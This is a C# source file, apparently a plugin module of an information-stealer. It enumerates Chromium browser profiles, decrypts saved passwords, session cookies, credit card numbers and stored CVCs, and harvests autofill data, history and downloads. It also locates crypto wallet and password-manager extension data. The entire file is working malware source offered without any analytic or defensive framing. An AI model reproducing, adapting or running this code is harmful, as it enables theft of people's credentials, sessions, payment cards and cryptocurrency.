

using InvokedCommon.Structs;
using System.Collections.Generic;
using System.IO;


namespace Plugin.Helper.Stealer
{
	public static class Chromium
	{
		public static ChromiumBrowser[] GetAllInfo(ChromiumBrowserOptions options)
		{
			List<ChromiumBrowser> chromiumBrowserList = new List<ChromiumBrowser>();
			bool flag1 = (options & ChromiumBrowserOptions.Logins) == ChromiumBrowserOptions.Logins;
			bool flag2 = (options & ChromiumBrowserOptions.Cookies) == ChromiumBrowserOptions.Cookies;
			bool flag3 = (options & ChromiumBrowserOptions.Autofills) == ChromiumBrowserOptions.Autofills;
			bool flag4 = (options & ChromiumBrowserOptions.Downloads) == ChromiumBrowserOptions.Downloads;
			bool flag5 = (options & ChromiumBrowserOptions.History) == ChromiumBrowserOptions.History;
			bool flag6 = (options & ChromiumBrowserOptions.CreditCards) == ChromiumBrowserOptions.CreditCards;
			bool flag7 = (options & ChromiumBrowserOptions.CryptoExtensions) == ChromiumBrowserOptions.CryptoExtensions;
			bool flag8 = (options & ChromiumBrowserOptions.PasswordManagerExtensions) == ChromiumBrowserOptions.PasswordManagerExtensions;
			if (!flag1 && !flag2 && !flag3 && !flag4 && !flag5 && !flag6 && !flag7 && !flag8)
				return new ChromiumBrowser[0];
			foreach (KeyValuePair<string, string> chromiumBrowser in Configuration.ChromiumBrowsers)
			{
				List<ChromiumProfile> chromiumProfileList = new List<ChromiumProfile>();
				string key = chromiumBrowser.Key;
				string str = chromiumBrowser.Value;
				if (Directory.Exists(str))
				{
					ChromeDecryptor decryptor = new ChromeDecryptor(str);
					int num = decryptor.operational ? 1 : 0;
					foreach (string profile in Chromium.GetProfiles(str))
					{
						string profilePath = Path.Combine(str, profile);
						Login[] _logins = (Login[]) null;
						Cookie[] _cookies = (Cookie[]) null;
						AutoFill[] _autofills = (AutoFill[]) null;
						Download[] _downloads = (Download[]) null;
						HistoryEntry[] _history = (HistoryEntry[]) null;
						ChromiumCreditCard[] _creditCards = (ChromiumCreditCard[]) null;
						ChromiumCryptoExtension[] _cryptoExtensions = (ChromiumCryptoExtension[]) null;
						ChromiumPasswordExtension[] _passwordManagerExtensions = (ChromiumPasswordExtension[]) null;
						if (flag1 && decryptor.operational)
							_logins = Chromium.GetLogins(profilePath, decryptor);
						if (flag2 && decryptor.operational)
							_cookies = Chromium.GetCookies(profilePath, decryptor);
						if (flag3)
							_autofills = Chromium.GetAutoFills(profilePath);
						if (flag4)
							_downloads = Chromium.GetDownloads(profilePath);
						if (flag5)
							_history = Chromium.GetHistory(profilePath);
						if (flag6 && decryptor.operational)
							_creditCards = Chromium.GetCreditCards(profilePath, decryptor);
						if (flag7)
							_cryptoExtensions = Chromium.GetCryptoExtensions(profilePath);
						if (flag8)
							_passwordManagerExtensions = Chromium.GetPasswordManagerExtensions(profilePath);
						chromiumProfileList.Add(new ChromiumProfile(_logins, _cookies, _autofills, _downloads, _history, _creditCards, _cryptoExtensions, _passwordManagerExtensions, profile));
					}
					chromiumBrowserList.Add(new ChromiumBrowser(chromiumProfileList.ToArray(), key));
				}
			}
			return chromiumBrowserList.ToArray();
		}

		public static string[] GetProfiles(string userDataPath)
		{
			List<string> stringList = new List<string>();
			if (!Directory.Exists(Path.Combine(userDataPath, "Default")))
			{
				stringList.Add("");
				return stringList.ToArray();
			}
			stringList.Add("Default");
			int num = 1;
			while (true)
			{
				string path = Path.Combine(userDataPath, "Profile " + num.ToString());
				if (Directory.Exists(path))
				{
					++num;
					stringList.Add(path);
				}
				else
					break;
			}
			return stringList.ToArray();
		}

		public static Login[] GetLogins(string profilePath, ChromeDecryptor decryptor)
		{
			List<Login> loginList = new List<Login>();
			string str1 = Path.Combine(profilePath, "Login Data");
			if (!File.Exists(str1))
				return (Login[]) null;
			byte[] db_bytes = Utils.ForceReadFile(str1);
			if (db_bytes == null)
				return (Login[]) null;
			SqlLite3Parser sqlLite3Parser;
			try
			{
				sqlLite3Parser = new SqlLite3Parser(db_bytes);
			}
			catch
			{
				return (Login[]) null;
			}
			if (!sqlLite3Parser.ReadTable("logins"))
				return (Login[]) null;
			for (int index = 0; index < sqlLite3Parser.GetRowCount(); ++index)
			{
				byte[] buffer = sqlLite3Parser.GetValue<byte[]>(index, "password_value");
				string _username = sqlLite3Parser.GetValue<string>(index, "username_value");
				string _hostname = sqlLite3Parser.GetValue<string>(index, "action_url");
				if (buffer != null && _username != null && _hostname != null)
				{
					if (string.IsNullOrEmpty(_hostname))
					{
						string str2 = sqlLite3Parser.GetValue<string>(index, "origin_url");
						if (str2 != null)
							_hostname = str2;
					}
					string _password = decryptor.Decrypt(buffer);
					if (!string.IsNullOrEmpty(_password))
						loginList.Add(new Login(_username, _password, _hostname));
				}
			}
			return loginList.ToArray();
		}

		public static Cookie[] GetCookies(string profilePath, ChromeDecryptor decryptor)
		{
			List<Cookie> cookieList = new List<Cookie>();
			string str1 = Path.Combine(profilePath, "Network", "Cookies");
			if (!File.Exists(str1))
				return (Cookie[]) null;
			byte[] db_bytes = Utils.ForceReadFile(str1);
			if (db_bytes == null)
				return (Cookie[]) null;
			SqlLite3Parser sqlLite3Parser;
			try
			{
				sqlLite3Parser = new SqlLite3Parser(db_bytes);
			}
			catch
			{
				return (Cookie[]) null;
			}
			if (!sqlLite3Parser.ReadTable("cookies"))
				return (Cookie[]) null;
			for (int index = 0; index < sqlLite3Parser.GetRowCount(); ++index)
			{
				string _domain = sqlLite3Parser.GetValue<string>(index, "host_key");
				string _name = sqlLite3Parser.GetValue<string>(index, "name");
				string _path = sqlLite3Parser.GetValue<string>(index, "path");
				byte[] buffer = sqlLite3Parser.GetValue<byte[]>(index, "encrypted_value");
				long _expiry = sqlLite3Parser.GetValue<long>(index, "expires_utc");
				bool _isSecure = sqlLite3Parser.GetValue<int>(index, "is_secure") == 1;
				bool _isHttpOnly = sqlLite3Parser.GetValue<int>(index, "is_httponly") == 1;
				if (_domain != null && _name != null && _path != null && buffer != null)
				{
					string str2 = decryptor.Decrypt(buffer);
					if (!string.IsNullOrEmpty(str2))
						cookieList.Add(new Cookie(_domain, _path, _name, str2, (int) _expiry, _isSecure, _isHttpOnly));
				}
			}
			return cookieList.ToArray();
		}

		public static AutoFill[] GetAutoFills(string profilePath)
		{
			List<AutoFill> autoFillList = new List<AutoFill>();
			string str1 = Path.Combine(profilePath, "Web Data");
			if (!File.Exists(str1))
				return (AutoFill[]) null;
			byte[] db_bytes = Utils.ForceReadFile(str1);
			if (db_bytes == null)
				return (AutoFill[]) null;
			SqlLite3Parser sqlLite3Parser;
			try
			{
				sqlLite3Parser = new SqlLite3Parser(db_bytes);
			}
			catch
			{
				return (AutoFill[]) null;
			}
			if (!sqlLite3Parser.ReadTable("autofill"))
				return (AutoFill[]) null;
			for (int index = 0; index < sqlLite3Parser.GetRowCount(); ++index)
			{
				string _name = sqlLite3Parser.GetValue<string>(index, "name");
				string str2 = sqlLite3Parser.GetValue<string>(index, "value");
				if (_name != null && str2 != null)
					autoFillList.Add(new AutoFill(_name, str2));
			}
			return autoFillList.ToArray();
		}

		public static Download[] GetDownloads(string profilePath)
		{
			List<Download> downloadList = new List<Download>();
			string str = Path.Combine(profilePath, "History");
			if (!File.Exists(str))
				return (Download[]) null;
			byte[] db_bytes = Utils.ForceReadFile(str);
			if (db_bytes == null)
				return (Download[]) null;
			SqlLite3Parser sqlLite3Parser;
			try
			{
				sqlLite3Parser = new SqlLite3Parser(db_bytes);
			}
			catch
			{
				return (Download[]) null;
			}
			if (!sqlLite3Parser.ReadTable("downloads"))
				return (Download[]) null;
			for (int index = 0; index < sqlLite3Parser.GetRowCount(); ++index)
			{
				string _path = sqlLite3Parser.GetValue<string>(index, "target_path");
				string _url = sqlLite3Parser.GetValue<string>(index, "tab_url");
				if (_path != null && _url != null)
					downloadList.Add(new Download(_url, _path));
			}
			downloadList.Reverse();
			return downloadList.ToArray();
		}

		public static HistoryEntry[] GetHistory(string profilePath)
		{
			List<HistoryEntry> historyEntryList = new List<HistoryEntry>();
			string str = Path.Combine(profilePath, "History");
			if (!File.Exists(str))
				return (HistoryEntry[]) null;
			byte[] db_bytes = Utils.ForceReadFile(str);
			if (db_bytes == null)
				return (HistoryEntry[]) null;
			SqlLite3Parser sqlLite3Parser;
			try
			{
				sqlLite3Parser = new SqlLite3Parser(db_bytes);
			}
			catch
			{
				return (HistoryEntry[]) null;
			}
			if (!sqlLite3Parser.ReadTable("urls"))
				return (HistoryEntry[]) null;
			for (int index = 0; index < sqlLite3Parser.GetRowCount(); ++index)
			{
				string _url = sqlLite3Parser.GetValue<string>(index, "url");
				string _title = sqlLite3Parser.GetValue<string>(index, "title");
				if (_url != null && _title != null)
					historyEntryList.Add(new HistoryEntry(_url, _title));
			}
			historyEntryList.Reverse();
			return historyEntryList.ToArray();
		}

		public static ChromiumCreditCard[] GetCreditCards(string profilePath, ChromeDecryptor decryptor)
		{
			List<ChromiumCreditCard> chromiumCreditCardList = new List<ChromiumCreditCard>();
			string str1 = Path.Combine(profilePath, "Web Data");
			if (!File.Exists(str1))
				return (ChromiumCreditCard[]) null;
			byte[] db_bytes = Utils.ForceReadFile(str1);
			if (db_bytes == null)
				return (ChromiumCreditCard[]) null;
			SqlLite3Parser sqlLite3Parser;
			try
			{
				sqlLite3Parser = new SqlLite3Parser(db_bytes);
			}
			catch
			{
				return (ChromiumCreditCard[]) null;
			}
			Dictionary<string, string> dictionary = new Dictionary<string, string>();
			if (sqlLite3Parser.ReadTable("local_stored_cvc"))
			{
				for (int index = 0; index < sqlLite3Parser.GetRowCount(); ++index)
				{
					string key = sqlLite3Parser.GetValue<string>(index, "guid");
					byte[] buffer = sqlLite3Parser.GetValue<byte[]>(index, "value_encrypted");
					if (key != null && buffer != null)
					{
						string str2 = decryptor.Decrypt(buffer);
						if (str2 != null)
							dictionary[key] = str2;
					}
				}
			}
			if (!sqlLite3Parser.ReadTable("credit_cards"))
				return (ChromiumCreditCard[]) null;
			for (int index = 0; index < sqlLite3Parser.GetRowCount(); ++index)
			{
				string key = sqlLite3Parser.GetValue<string>(index, "guid");
				string _cardholderName = sqlLite3Parser.GetValue<string>(index, "name_on_card");
				int _expirationMonth = (int) sqlLite3Parser.GetValue<byte>(index, "expiration_month");
				int _expirationYear = (int) sqlLite3Parser.GetValue<short>(index, "expiration_year");
				byte[] buffer = sqlLite3Parser.GetValue<byte[]>(index, "card_number_encrypted");
				string _cvv = dictionary[key];
				if (_cardholderName != null && _expirationMonth != 0 && _expirationYear != 0 && buffer != null)
				{
					string _cardNumber = decryptor.Decrypt(buffer);
					if (_cardNumber != null)
						chromiumCreditCardList.Add(new ChromiumCreditCard(_cardholderName, _cardNumber, _cvv, _expirationMonth, _expirationYear));
				}
			}
			return chromiumCreditCardList.ToArray();
		}

		public static ChromiumCryptoExtension[] GetCryptoExtensions(string profilePath)
		{
			List<ChromiumCryptoExtension> chromiumCryptoExtensionList = new List<ChromiumCryptoExtension>();
			string path1 = Path.Combine(profilePath, "Local Extension Settings");
			Dictionary<string, string> cryptoExtensions = Configuration.ChromiumCryptoExtensions;
			if (path1.ToLower().Contains("microsoft"))
				cryptoExtensions = Configuration.EdgeCryptoExtensions;
			foreach (KeyValuePair<string, string> keyValuePair in cryptoExtensions)
			{
				string str = Path.Combine(path1, keyValuePair.Value);
				if (Directory.Exists(str))
					chromiumCryptoExtensionList.Add(new ChromiumCryptoExtension(keyValuePair.Key, str));
			}
			return chromiumCryptoExtensionList.ToArray();
		}

		public static ChromiumPasswordExtension[] GetPasswordManagerExtensions(string profilePath)
		{
			List<ChromiumPasswordExtension> passwordExtensionList = new List<ChromiumPasswordExtension>();
			string path1 = Path.Combine(profilePath, "Local Extension Settings");
			Dictionary<string, string> managerExtensions = Configuration.ChromePasswordManagerExtensions;
			if (path1.ToLower().Contains("microsoft"))
				managerExtensions = Configuration.EdgePasswordManagerExtensions;
			foreach (KeyValuePair<string, string> keyValuePair in managerExtensions)
			{
				string str = Path.Combine(path1, keyValuePair.Value);
				if (Directory.Exists(str))
					passwordExtensionList.Add(new ChromiumPasswordExtension(keyValuePair.Key, str));
			}
			return passwordExtensionList.ToArray();
		}
	}
}
